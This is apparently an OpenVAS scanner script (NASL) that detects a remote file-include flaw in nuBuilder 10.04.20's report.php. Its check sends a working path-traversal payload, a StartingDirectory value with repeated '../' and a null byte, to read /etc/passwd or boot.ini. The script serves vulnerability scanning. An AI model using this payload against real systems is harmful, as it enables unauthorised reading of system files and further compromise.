###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nubuilder_42027.nasl 5323 2017-02-17 08:49:23Z teissa $
#
# nuBuilder 'report.php' Remote File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "nuBuilder is prone to a remote file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information or to execute arbitrary script code in the
context of the webserver process. This may allow the attacker to
compromise the application and the computer; other attacks are
also possible.

nuBuilder 10.04.20 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100730);
 script_version("$Revision: 5323 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-17 09:49:23 +0100 (Fri, 17 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-08-02 14:28:14 +0200 (Mon, 02 Aug 2010)");
 script_bugtraq_id(42027);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("nuBuilder 'report.php' Remote File Include Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/42027");
 script_xref(name : "URL" , value : "http://www.nubuilder.com/nubuilderwww/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/nubuilder",cgi_dirs());
files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach dir (dirs) {
  foreach file (keys(files)) {

    url = string(dir,"/productionnu2/report.php?StartingDirectory=../../../../../../../../../../../",files[file],"%00"); 
    if(http_vuln_check(port:port, url:url,pattern:file)) {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(0);
